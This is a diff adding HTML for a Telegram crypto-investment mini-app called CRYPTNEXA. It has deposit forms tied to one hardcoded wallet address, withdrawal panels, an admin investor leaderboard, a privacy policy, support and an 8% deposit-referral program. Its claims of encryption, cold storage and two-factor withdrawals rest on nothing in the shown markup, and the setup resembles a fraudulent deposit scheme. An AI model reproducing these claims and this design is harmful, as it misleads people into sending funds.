+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-blue-400 font-bold">ERC20</p>
+              </div>
+            </div>
+          </div>
+
+          <div onclick="selectCryptoMethod('ton')" id="card-ton" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-ton" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png?v=040" alt="TON" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#0098EA;font-weight:900;font-size:16px\'>💎</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">TON</h5>
+                <p class="text-[9px] text-cyan-400 font-bold">Toncoin</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="bybit-amount-box">
+        <div class="flex items-center justify-between mb-1">
+          <span class="text-[10px] text-gray-400 uppercase font-bold">Amount</span>
+          <span class="text-[10px] text-gray-500 font-mono">Min $5.00</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <span class="text-2xl font-black text-gray-500 font-mono">$</span>
+          <input type="number" id="deposit-amount-input" placeholder="0.00" class="bybit-amount-input" inputmode="decimal">
+        </div>
+        <div class="flex gap-2 mt-3">
+          <button onclick="setDepositQuickAmount(50)" class="quick-chip">$50</button>
+          <button onclick="setDepositQuickAmount(100)" class="quick-chip">$100</button>
+          <button onclick="setDepositQuickAmount(500)" class="quick-chip">$500</button>
+          <button onclick="setDepositQuickAmount(1000)" class="quick-chip">$1K</button>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3 border border-white/5">
+        <div class="bybit-info-row">
+          <span class="bybit-info-label">Network</span>
+          <span id="selected-network-badge" class="text-emerald-400 font-black font-mono text-[11px]">USDT (TRC20)</span>
+        </div>
+
+        <div class="address-display p-3 space-y-2">
+          <div class="flex items-center gap-1.5 text-[10px] text-gray-400 uppercase font-bold">
+            <i data-lucide="wallet" class="w-3 h-3 text-emerald-400"></i> Deposit Address
+          </div>
+          <div class="flex items-center gap-2">
+            <input type="text" id="wallet-address-text" readonly value="TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs" class="bg-transparent text-[11px] text-emerald-400 font-mono font-bold w-full focus:outline-none tracking-tight">
+            <button onclick="copyToClipboard('wallet-address-text')" class="px-3 py-2 bg-gradient-to-r from-emerald-500 to-cyan-500 text-black font-black rounded-lg text-[10px] shrink-0 flex items-center gap-1 active:scale-95 transition-all">
+              <i data-lucide="copy" class="w-3 h-3"></i> COPY
+            </button>
+          </div>
+        </div>
+
+        <div class="flex items-start gap-2 p-2.5 rounded-lg bg-amber-500/10 border border-amber-500/20">
+          <i data-lucide="alert-triangle" class="w-3.5 h-3.5 text-amber-400 shrink-0 mt-0.5"></i>
+          <div class="text-[10px] leading-relaxed text-amber-200/90">
+            Send only <strong class="text-white" id="warning-net-name">USDT (TRC20)</strong>. Wrong network = <strong class="text-amber-400">permanent loss</strong>.
+          </div>
+        </div>
+
+        <button onclick="toggleDepositQr()" id="qr-toggle-btn" class="w-full bg-white/5 hover:bg-white/10 border border-white/10 text-white font-bold py-2.5 rounded-xl text-xs flex items-center justify-center gap-1.5 transition-all">
+          <i data-lucide="qr-code" class="w-4 h-4"></i> Show QR Code
+        </button>
+
+        <div id="deposit-qr-container" class="pt-1 flex flex-col items-center justify-center hidden">
+          <div class="qr-frame">
+            <div>
+              <img id="qr-code-img" src="https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=TLPVBmQnS6VTV7MwzLzYy7EjUKqsKob7hs&color=080b11&bgcolor=ffffff" alt="QR" class="w-40 h-40 rounded-md">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3 border border-white/5">
+        <div class="space-y-2">
+          <label class="text-[10px] text-gray-400 uppercase font-bold flex items-center gap-1.5">
+            <i data-lucide="hash" class="w-3 h-3 text-emerald-400"></i> TxID (Proof of Payment)
+          </label>
+          <input type="text" id="tx-hash-input" placeholder="Paste transaction hash..." class="input-safe w-full bg-brand-bg border border-white/10 rounded-xl p-3 text-[11px] text-white font-mono focus:border-emerald-500/50">
+        </div>
+
+        <div class="relative flex flex-col items-center justify-center p-3.5 border border-dashed border-white/20 rounded-xl bg-white/5 hover:border-emerald-500/40 transition-all cursor-pointer" onclick="document.getElementById('deposit-screenshot-file').click()">
+          <input type="file" id="deposit-screenshot-file" accept="image/*" class="hidden" onchange="handleScreenshotUpload(event)">
+          <div id="upload-placeholder-content" class="flex items-center gap-2 text-gray-400">
+            <i data-lucide="image-plus" class="w-4 h-4 text-emerald-400"></i>
+            <span class="text-[11px] font-bold">Upload screenshot</span>
+          </div>
+          <div id="upload-preview-container" class="hidden flex items-center gap-2 text-emerald-400 text-xs font-bold">
+            <i data-lucide="check-circle-2" class="w-4 h-4"></i>
+            <span id="uploaded-file-name" class="truncate max-w-[150px]">Attached</span>
+          </div>
+        </div>
+      </div>
+
+      <button onclick="initiateDepositProcess()" class="w-full relative overflow-hidden rounded-xl font-extrabold shadow-lg active:scale-95 transition-all">
+        <span class="block gradient-bg px-4 py-3.5 text-black text-sm font-black tracking-wide flex items-center justify-center gap-2">
+          <i data-lucide="shield-check" class="w-4 h-4"></i> SUBMIT DEPOSIT
+        </span>
+      </button>
+    </div>
+
+    <!-- WITHDRAW -->
+    <div id="section-withdraw" class="space-y-4 hidden">
+      <div class="flex items-center justify-between">
+        <button onclick="backToWalletOverview()" class="text-xs text-cyan-400 flex items-center gap-1.5 font-bold bg-cyan-500/10 hover:bg-cyan-500/20 px-3 py-2 rounded-lg border border-cyan-500/20 transition-all">
+          <i data-lucide="arrow-left" class="w-3.5 h-3.5"></i> Back
+        </button>
+        <span class="text-[9px] bg-cyan-500/10 text-cyan-400 font-bold px-2.5 py-1 rounded-full font-mono border border-cyan-500/20">0% FEE</span>
+      </div>
+
+      <div class="bybit-tabs">
+        <div class="bybit-tab" onclick="openWalletAction('deposit')">
+          <i data-lucide="arrow-down-to-line" class="w-4 h-4"></i> Deposit
+        </div>
+        <div class="bybit-tab active withdraw-tab" onclick="openWalletAction('withdraw')">
+          <i data-lucide="arrow-up-from-line" class="w-4 h-4"></i> Withdraw
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 border border-cyan-500/20">
+        <div class="flex items-center justify-between">
+          <span class="text-[10px] text-gray-400 uppercase font-bold">Available</span>
+          <span class="text-[10px] text-cyan-400 font-mono">USD</span>
+        </div>
+        <h3 class="text-2xl font-black text-white font-mono mt-1" id="withdraw-max-label-2">$0.00</h3>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3 border border-white/5">
+        <div class="flex items-center justify-between">
+          <span class="text-[10px] text-gray-400 uppercase font-bold">Select Network</span>
+          <span class="text-[10px] text-cyan-400 font-mono font-bold">USDT</span>
+        </div>
+
+        <div class="grid grid-cols-2 gap-2">
+          <div onclick="selectWithdrawNetwork('usdt_trc20')" id="w-card-usdt_trc20" class="network-card active">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-usdt" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/tether-usdt-logo.png?v=040" alt="USDT" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#26A17B;font-weight:900;font-size:16px\'>₮</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-emerald-400 font-bold">TRC20</p>
+              </div>
+            </div>
+          </div>
+          <div onclick="selectWithdrawNetwork('usdt_bep20')" id="w-card-usdt_bep20" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-bnb" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png?v=040" alt="BEP20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#F3BA2F;font-weight:900;font-size:16px\'>⚡</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-amber-400 font-bold">BEP20</p>
+              </div>
+            </div>
+          </div>
+          <div onclick="selectWithdrawNetwork('usdt_erc20')" id="w-card-usdt_erc20" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-eth" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/ethereum-eth-logo.png?v=040" alt="ERC20" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#627EEA;font-weight:900;font-size:16px\'>Ξ</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">USDT</h5>
+                <p class="text-[9px] text-blue-400 font-bold">ERC20</p>
+              </div>
+            </div>
+          </div>
+          <div onclick="selectWithdrawNetwork('ton')" id="w-card-ton" class="network-card">
+            <div class="network-check"><i data-lucide="check" class="w-3 h-3"></i></div>
+            <div class="flex items-center gap-2.5">
+              <div class="network-logo-wrap network-logo-ton" style="width:34px;height:34px;padding:5px;">
+                <img src="https://cryptologos.cc/logos/toncoin-ton-logo.png?v=040" alt="TON" onerror="this.style.display='none';this.parentElement.innerHTML='<span style=\'color:#0098EA;font-weight:900;font-size:16px\'>💎</span>'">
+              </div>
+              <div class="min-w-0">
+                <h5 class="text-[11px] font-black text-white leading-tight">TON</h5>
+                <p class="text-[9px] text-cyan-400 font-bold">Toncoin</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="bybit-amount-box">
+        <div class="flex items-center justify-between mb-1">
+          <span class="text-[10px] text-gray-400 uppercase font-bold">Withdrawal Amount</span>
+          <span class="text-[10px] text-gray-500 font-mono">Min $5.00</span>
+        </div>
+        <div class="flex items-center gap-2">
+          <span class="text-2xl font-black text-gray-500 font-mono">$</span>
+          <input type="number" id="withdraw-amount" placeholder="0.00" oninput="calculateWithdrawFee()" class="bybit-amount-input" inputmode="decimal">
+          <button onclick="setMaxWithdraw()" class="text-[10px] font-black text-cyan-400 bg-cyan-500/10 border border-cyan-500/20 px-3 py-1.5 rounded-lg shrink-0">MAX</button>
+        </div>
+        <div class="flex gap-2 mt-3">
+          <button onclick="setWithdrawQuickAmount(50)" class="quick-chip">$50</button>
+          <button onclick="setWithdrawQuickAmount(100)" class="quick-chip">$100</button>
+          <button onclick="setWithdrawQuickAmount(500)" class="quick-chip">$500</button>
+          <button onclick="setMaxWithdraw()" class="quick-chip">MAX</button>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 space-y-3 border border-white/5">
+        <div class="bybit-info-row">
+          <span class="bybit-info-label">Network</span>
+          <span id="withdraw-network-label" class="text-[10px] bg-cyan-500/10 text-cyan-400 px-2 py-0.5 rounded font-mono font-bold">TRC20</span>
+        </div>
+
+        <div class="address-display p-3 space-y-2">
+          <div class="flex items-center gap-1.5 text-[10px] text-gray-400 uppercase font-bold">
+            <i data-lucide="wallet" class="w-3 h-3 text-cyan-400"></i> Destination Address
+          </div>
+          <input type="text" id="withdraw-address" placeholder="Paste wallet address..." class="input-safe w-full bg-transparent text-[11px] text-white font-mono focus:outline-none tracking-tight placeholder-gray-600">
+        </div>
+
+        <div class="flex items-start gap-2 p-2.5 rounded-lg bg-amber-500/10 border border-amber-500/20">
+          <i data-lucide="alert-triangle" class="w-3.5 h-3.5 text-amber-400 shrink-0 mt-0.5"></i>
+          <div class="text-[10px] leading-relaxed text-amber-200/90">
+            Ensure wallet supports <strong class="text-white" id="warning-withdraw-net">TRC20</strong>. Wrong network = <strong class="text-amber-400">permanent loss</strong>.
+          </div>
+        </div>
+      </div>
+
+      <div class="glass-card rounded-2xl p-4 border border-cyan-500/20">
+        <div class="bybit-info-row">
+          <span class="bybit-info-label">Network Fee</span>
+          <span class="bybit-info-value text-emerald-400">$0.00</span>
+        </div>
+        <div class="bybit-info-row">
+          <span class="bybit-info-label">You Receive</span>
+          <span id="net-receive-text" class="text-xl font-black text-cyan-400 font-mono">$0.00</span>
+        </div>
+      </div>
+
+      <button onclick="initiateWithdrawalProcess()" class="w-full relative overflow-hidden rounded-xl font-extrabold shadow-lg active:scale-95 transition-all">
+        <span class="block bg-gradient-to-r from-cyan-500 to-blue-600 px-4 py-3.5 text-white text-sm font-black tracking-wide flex items-center justify-center gap-2">
+          <i data-lucide="external-link" class="w-4 h-4"></i> CONFIRM WITHDRAWAL
+        </span>
+      </button>
+    </div>
+  </main>
+
+  <!-- HISTORY -->
+  <main id="tab-history" class="tab-content p-4 space-y-4">
+    <div class="flex items-center justify-between pt-2">
+      <h3 class="text-sm font-bold text-gray-400 uppercase tracking-wider flex items-center gap-2">
+        <i data-lucide="history" class="w-4 h-4 text-emerald-400"></i> Transaction History
+      </h3>
+      <span class="text-[9px] text-gray-500 font-mono" id="history-count-badge">0 records</span>
+    </div>
+
+    <div id="history-container" class="space-y-3">
+      <div class="glass-card rounded-2xl p-6 text-center border border-brand-border">
+        <div class="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center mx-auto mb-3">
+          <i data-lucide="receipt" class="w-7 h-7 text-emerald-400"></i>
+        </div>
+        <p class="text-sm font-bold text-white mb-1">No Transactions Yet</p>
+        <p class="text-[11px] text-gray-400 leading-relaxed">Your transaction history will appear here.</p>
+      </div>
+    </div>
+  </main>
+
+  <!-- COMMUNITY (ADMIN-ONLY LEADERBOARD) -->
+  <main id="tab-community" class="tab-content p-4 space-y-4">
+    
+    <div class="community-hero p-5">
+      <div class="relative z-10">
+        <div class="flex items-center justify-between mb-4">
+          <div class="flex items-center gap-3">
+            <div class="w-12 h-12 gradient-bg rounded-2xl flex items-center justify-center text-black shadow-lg shadow-emerald-500/25 shrink-0">
+              <i data-lucide="users" class="w-6 h-6"></i>
+            </div>
+            <div>
+              <h3 class="font-black text-white text-base">Community Hub</h3>
+              <span class="text-[10px] text-emerald-400 font-mono font-bold uppercase tracking-wider">Global Investors Network</span>
+            </div>
+          </div>
+          <span class="text-[9px] bg-emerald-500/15 text-emerald-400 border border-emerald-500/30 px-2.5 py-1 rounded-full font-mono font-bold flex items-center gap-1">
+            <span class="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"></span>
+            LIVE
+          </span>
+        </div>
+
+        <div class="grid grid-cols-3 gap-2">
+          <div class="community-stat-card">
+            <div class="community-stat-icon bg-emerald-500/10 text-emerald-400">
+              <i data-lucide="users-2" class="w-4 h-4"></i>
+            </div>
+            <div class="community-stat-value text-emerald-400" id="community-total-users">0</div>
+            <div class="community-stat-label">Total Users</div>
+          </div>
+          <div class="community-stat-card">
+            <div class="community-stat-icon bg-cyan-500/10 text-cyan-400">
+              <i data-lucide="activity" class="w-4 h-4"></i>
+            </div>
+            <div class="community-stat-value text-cyan-400" id="community-active-investments">0</div>
+            <div class="community-stat-label">Active Stakes</div>
+          </div>
+          <div class="community-stat-card">
+            <div class="community-stat-icon bg-purple-500/10 text-purple-400">
+              <i data-lucide="trending-up" class="w-4 h-4"></i>
+            </div>
+            <div class="community-stat-value text-purple-400" id="community-total-tvl">$0</div>
+            <div class="community-stat-label">Total TVL</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ADMIN-ONLY LEADERBOARD SECTION -->
+    <div id="admin-leaderboard-section" style="display:none;">
+      <div class="glass-card rounded-xl p-2.5 mb-3 border border-amber-500/30 bg-amber-500/5 flex items-center gap-2">
+        <i data-lucide="shield-alert" class="w-3.5 h-3.5 text-amber-400"></i>
+        <span class="text-[10px] font-bold text-amber-400 uppercase tracking-wider">Admin Access Only</span>
+      </div>
+
+      <!-- SEARCH -->
+      <div class="community-search-box mb-3">
+        <i data-lucide="search" class="w-4 h-4 text-emerald-400"></i>
+        <input 
+          type="text" 
+          id="community-search-input" 
+          class="community-search-input" 
+          placeholder="Search by ID, username or name..."
+          oninput="filterCommunityUsers()"
+        >
+        <button onclick="clearCommunitySearch()" class="text-gray-500 hover:text-white transition-colors" id="community-search-clear" style="display:none;">
+          <i data-lucide="x" class="w-4 h-4"></i>
+        </button>
+      </div>
+
+      <div>
+        <div class="flex items-center justify-between mb-3">
+          <h4 class="text-xs font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
+            <i data-lucide="trophy" class="w-4 h-4 text-amber-400"></i> Top Investors
+          </h4>
+          <span class="text-[9px] text-gray-500 font-mono" id="community-user-count-badge">0 users</span>
+        </div>
+        <div id="community-users-list" class="space-y-2.5"></div>
+      </div>
+    </div>
+
+    <!-- NON-ADMIN MESSAGE -->
+    <div id="non-admin-message" class="glass-card rounded-2xl p-6 text-center border border-brand-border">
+      <div class="w-14 h-14 rounded-2xl bg-emerald-500/10 flex items-center justify-center mx-auto mb-3">
+        <i data-lucide="trophy" class="w-7 h-7 text-emerald-400"></i>
+      </div>
+      <p class="text-sm font-bold text-white mb-1">Leaderboard Available</p>
+      <p class="text-[11px] text-gray-400 leading-relaxed">Top investor rankings are visible to administrators only.</p>
+    </div>
+
+    <!-- PRIVACY POLICY -->
+    <div class="pt-4">
+      <div class="flex items-center gap-2 mb-3">
+        <div class="w-8 h-8 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center">
+          <i data-lucide="shield-check" class="w-4 h-4"></i>
+        </div>
+        <div>
+          <h4 class="text-xs font-bold text-white uppercase tracking-wider">Privacy Policy</h4>
+          <p class="text-[9px] text-gray-500 font-mono">Last updated: Jan 2025</p>
+        </div>
+      </div>
+
+      <div class="space-y-3">
+        <div class="privacy-card">
+          <div class="privacy-heading">
+            <div class="privacy-heading-icon"><i data-lucide="lock" class="w-3.5 h-3.5"></i></div>
+            <span>Data Protection</span>
+          </div>
+          <p class="privacy-text">
+            CRYPTNEXA uses <strong>AES-256 encryption</strong> for all sensitive data. Your personal information, transaction details, and wallet addresses are never sold, rented, or shared with third parties without explicit consent.
+          </p>
+        </div>
+
+        <div class="privacy-card">
+          <div class="privacy-heading">
+            <div class="privacy-heading-icon"><i data-lucide="user-check" class="w-3.5 h-3.5"></i></div>
+            <span>Information We Collect</span>
+          </div>
+          <div class="space-y-1">
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Identity:</strong> Telegram ID, username, and display name for account management.</span></div>
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Transactions:</strong> Deposit, withdrawal, and investment records for regulatory compliance.</span></div>
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Blockchain Data:</strong> Public wallet addresses and transaction hashes for verification.</span></div>
+          </div>
+        </div>
+
+        <div class="privacy-card">
+          <div class="privacy-heading">
+            <div class="privacy-heading-icon"><i data-lucide="fingerprint" class="w-3.5 h-3.5"></i></div>
+            <span>Your Rights</span>
+          </div>
+          <div class="space-y-1">
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Access:</strong> Request a copy of all data we hold about you at any time.</span></div>
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Deletion:</strong> Request permanent deletion of your account and all associated data.</span></div>
+            <div class="privacy-bullet"><div class="privacy-bullet-dot"></div><span><strong>Portability:</strong> Export your transaction history in a standard format.</span></div>
+          </div>
+        </div>
+
+        <div class="privacy-card">
+          <div class="privacy-heading">
+            <div class="privacy-heading-icon"><i data-lucide="shield-alert" class="w-3.5 h-3.5"></i></div>
+            <span>Security Measures</span>
+          </div>
+          <p class="privacy-text">
+            All data is stored on <strong>institutional-grade cold storage</strong> with multi-signature protection. Two-factor authentication is required for all withdrawals. We conduct regular security audits and penetration tests.
+          </p>
+        </div>
+
+        <div class="privacy-card">
+          <div class="privacy-heading">
+            <div class="privacy-heading-icon"><i data-lucide="mail" class="w-3.5 h-3.5"></i></div>
+            <span>Contact</span>
+          </div>
+          <p class="privacy-text">
+            For any privacy-related inquiries, please contact our Data Protection Officer at <strong>privacy@cryptnexa.io</strong> or reach out via our Telegram support channel.
+          </p>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- SUPPORT -->
+  <main id="tab-support" class="tab-content p-4 space-y-4">
+    <div class="glass-card rounded-2xl p-5 border border-emerald-500/30 relative overflow-hidden space-y-3">
+      <div class="absolute -right-10 -top-10 w-32 h-32 bg-cyan-500/10 rounded-full blur-2xl"></div>
+      
+      <div class="flex items-center justify-between">
+        <div class="flex items-center gap-3">
+          <div class="w-12 h-12 gradient-bg rounded-2xl flex items-center justify-center text-black shadow-lg shadow-emerald-500/20 shrink-0 font-black">
+            <i data-lucide="headphones" class="w-6 h-6"></i>
+          </div>
+          <div>
+            <h3 class="font-extrabold text-base text-white">VIP Concierge</h3>
+            <div class="flex items-center gap-1.5 mt-0.5">
+              <div class="live-dot"></div>
+              <span class="text-[11px] text-emerald-400 font-semibold">Live Support</span>
+            </div>
+          </div>
+        </div>
+        <span class="text-[10px] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2.5 py-1 rounded-full font-mono font-bold">24/7</span>
+      </div>
+
+      <p class="text-xs text-gray-300 leading-relaxed">Our institutional desk provides instant support for all blockchain transactions.</p>
+
+      <div class="grid grid-cols-2 gap-2.5 pt-1">
+        <a href="https://t.me/CRYPTNEXASupport" target="_blank" class="gradient-bg text-black font-extrabold py-3 px-3 rounded-xl text-xs flex items-center justify-center gap-2 shadow-md active:scale-95 transition-all text-center">
+          <i data-lucide="send" class="w-4 h-4"></i> Telegram Chat
+        </a>
+        <button onclick="scrollToTicketForm()" class="glass-btn text-cyan-400 border border-cyan-500/30 font-extrabold py-3 px-3 rounded-xl text-xs flex items-center justify-center gap-2 active:scale-95 transition-all">
+          <i data-lucide="ticket" class="w-4 h-4"></i> Submit Ticket
+        </button>
+      </div>
+    </div>
+
+    <div class="glass-card rounded-xl p-3.5 border border-brand-border flex items-center justify-between">
+      <div class="flex items-center gap-2.5">
+        <div class="w-8 h-8 rounded-lg bg-cyan-500/10 text-cyan-400 flex items-center justify-center">
+          <i data-lucide="clock" class="w-4 h-4"></i>
+        </div>
+        <div>
+          <h4 class="text-xs font-bold text-white">Avg. Response</h4>
+          <p class="text-[10px] text-gray-400">Telegram Instant / &lt; 5m Tickets</p>
+        </div>
+      </div>
+      <span class="text-xs font-extrabold text-cyan-400 font-mono">02:14</span>
+    </div>
+
+    <div id="support-ticket-box" class="glass-card rounded-2xl p-4 space-y-4 border border-brand-border">
+      <div class="flex items-center justify-between pb-2 border-b border-brand-border">
+        <h4 class="text-xs font-bold text-white uppercase tracking-wider flex items-center gap-1.5">
+          <i data-lucide="message-square-plus" class="w-4 h-4 text-emerald-400"></i> Open Ticket
+        </h4>
+        <span class="text-[10px] text-gray-400 font-mono" id="ticket-badge-num">Ticket #8492</span>
+      </div>
+
+      <div>
+        <label class="text-[11px] font-bold text-gray-400 uppercase">1. Inquiry Type</label>
+        <select id="support-category" class="w-full mt-1.5 bg-brand-bg border border-brand-border rounded-xl p-3 text-xs text-white font-semibold">
+          <option value="Deposit Verification">Deposit TxID Verification</option>
+          <option value="Withdrawal Inquiry">Withdrawal Status</option>
+          <option value="Investment ROI">Investment & ROI Question</option>
+          <option value="Affiliate Payout">Referral Commission</option>
+          <option value="Technical Issue">Technical Assistance</option>
+        </select>
+      </div>
+
+      <div>
+        <label class="text-[11px] font-bold text-gray-400 uppercase">2. Details</label>
+        <textarea id="support-message" rows="3" placeholder="Provide transaction hash, wallet address, or details..." class="w-full mt-1.5 bg-brand-bg border border-brand-border rounded-xl p-3 text-xs text-white"></textarea>
+      </div>
+
+      <button onclick="submitSupportTicket()" class="w-full gradient-bg text-black font-extrabold py-3 rounded-xl text-sm shadow-lg active:scale-95 transition-all flex items-center justify-center gap-2">
+        <i data-lucide="shield-check" class="w-4 h-4"></i> Submit Ticket
+      </button>
+    </div>
+
+    <div class="space-y-3 pt-2">
+      <h4 class="text-xs font-bold text-gray-400 uppercase tracking-wider flex items-center gap-1.5">
+        <i data-lucide="history" class="w-4 h-4 text-cyan-400"></i> My Tickets
+      </h4>
+      <div id="support-tickets-history" class="space-y-2.5">
+        <div class="glass-card rounded-xl p-3 text-center text-xs text-gray-400 border border-brand-border">No tickets yet.</div>
+      </div>
+    </div>
+  </main>
+
+  <!-- REFERRAL -->
+  <main id="tab-referral" class="tab-content p-4 space-y-4">
+    <div class="glass-card rounded-2xl p-5 space-y-4 border border-emerald-500/30 relative overflow-hidden bg-gradient-to-br from-[#111622] via-[#0c121f] to-[#080b11]">
+      <div class="absolute -right-12 -top-12 w-32 h-32 bg-emerald-500/10 rounded-full blur-2xl pointer-events-none"></div>
+
+      <div class="flex items-center gap-3">
+        <div class="w-12 h-12 gradient-bg rounded-2xl flex items-center justify-center text-black font-black shadow-lg shadow-emerald-500/25 shrink-0">
+          <i data-lucide="users" class="w-6 h-6"></i>
+        </div>
+        <div>
+          <h3 class="font-black text-white text-base">Affiliate Program</h3>
+          <span class="text-[10px] text-emerald-400 font-mono font-bold uppercase tracking-wider">Earn 8% Commission</span>
+        </div>
+      </div>
+
+      <p class="text-xs text-gray-300 leading-relaxed">
+        Share your link. When your referred investor makes a <strong class="text-emerald-400">Deposit</strong>, you earn <strong class="text-white">8% cash</strong> directly to your balance!
+      </p>
+
+      <div class="space-y-1.5">
+        <label class="text-[10px] font-bold text-gray-400 uppercase tracking-wider">Your Referral Link</label>
+        <div class="flex items-center gap-2 bg-brand-bg p-2.5 rounded-xl border border-brand-border">
+          <input type="text" id="ref-link" readonly value="https://t.me/CRYPTNEXABot?start=ref_" class="bg-transparent text-xs text-cyan-400 font-mono w-full focus:outline-none">
+          <button onclick="copyToClipboard('ref-link')" class="px-3 py-2 gradient-bg text-black font-extrabold rounded-lg text-xs shrink-0 flex items-center gap-1 shadow-md active:scale-95 transition-all">
+            <i data-lucide="copy" class="w-3.5 h-3.5"></i> Copy
+          </button>
+        </div>
+      </div>
+
+      <div class="grid grid-cols-2 gap-3 pt-2">
+        <div class="bg-brand-bg/80 p-3.5 rounded-xl border border-brand-border text-center space-y-1">
+          <span class="text-[10px] text-gray-400 uppercase font-bold block">Referrals</span>
+          <h3 class="text-lg font-black text-white font-mono">0</h3>
+          <span class="text-[9px] text-emerald-400 font-mono block">Active</span>
+        </div>
+        <div class="bg-brand-bg/80 p-3.5 rounded-xl border border-brand-border text-center space-y-1">
+          <span class="text-[10px] text-gray-400 uppercase font-bold block">Earned</span>
+          <h3 class="text-lg font-black text-emerald-400 font-mono">$0.00</h3>
+          <span class="text-[9px] text-cyan-400 font-mono block">Commission</span>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <!-- PROFILE -->
+  <main id="tab-profile" class="tab-content p-4 space-y-4">
+    <div class="relative overflow-hidden rounded-3xl p-6 bg-gradient-to-br from-[#111622] via-[#0d131f] to-[#080b11] border border-emerald-500/30 shadow-2xl space-y-5">
+      <div class="absolute -right-16 -top-16 w-48 h-48 bg-emerald-500/10 rounded-full blur-3xl pointer-events-none"></div>
+      <div class="absolute -left-16 -bottom-16 w-48 h-48 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none"></div>
+
+      <div class="flex items-center justify-between relative z-10">
+        <div class="flex items-center gap-2 bg-emerald-500/10 border border-emerald-500/20 px-3 py-1 rounded-full text-emerald-400 text-xs font-extrabold shadow-sm">
+          <i data-lucide="shield-check" class="w-3.5 h-3.5"></i> Verified
+        </div>
+        <span class="text-[10px] font-mono text-gray-400 tracking-wider uppercase">Node #4</span>
+      </div>
+
+      <div class="flex items-center gap-4 relative z-10 pt-2">
+        <div class="relative">
+          <div class="w-16 h-16 rounded-2xl gradient-bg flex items-center justify-center text-black font-black text-2xl shadow-xl shadow-emerald-500/20" id="profile-big-avatar">U</div>
+          <div class="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-emerald-400 border-2 border-[#111622] flex items-center justify-center text-[10px] text-black font-bold">✓</div>
+        </div>
+        <div class="space-y-1 overflow-hidden">
+          <h3 class="font-black text-white text-lg tracking-tight truncate" id="profile-fullname">Investor</h3>
+          <p class="text-xs text-emerald-400 font-mono font-bold tracking-wide" id="profile-username">@username</p>
+          <span class="inline-block text-[10px] text-gray-400 bg-brand-bg px-2 py-0.5 rounded border border-brand-border font-mono">VIP Account</span>
+        </div>
+      </div>
+
+      <div class="w-full h-px bg-gradient-to-r from-emerald-500/30 via-brand-border to-transparent"></div>
+
+      <div class="space-y-2.5 relative z-10 text-xs">
+        <div class="bg-brand-bg/80 p-3 rounded-2xl border border-brand-border flex items-center justify-between">
+          <div class="flex items-center gap-2.5 text-gray-400">
+            <div class="w-7 h-7 rounded-lg bg-cyan-500/10 text-cyan-400 flex items-center justify-center"><i data-lucide="hash" class="w-4 h-4"></i></div>
+            <span>Telegram ID</span>
+          </div>
+          <span class="font-mono font-extrabold text-white tracking-wider" id="profile-telegram-id">-</span>
+        </div>
+
+        <div class="bg-brand-bg/80 p-3 rounded-2xl border border-brand-border flex items-center justify-between">
+          <div class="flex items-center gap-2.5 text-gray-400">
+            <div class="w-7 h-7 rounded-lg bg-emerald-500/10 text-emerald-400 flex items-center justify-center"><i data-lucide="check-circle-2" class="w-4 h-4"></i></div>
+            <span>Status</span>
+          </div>
+          <span class="font-extrabold text-emerald-400 bg-emerald-500/10 border border-emerald-500/20 px-2.5 py-1 rounded-full text-[11px]">Active</span>
+        </div>
+
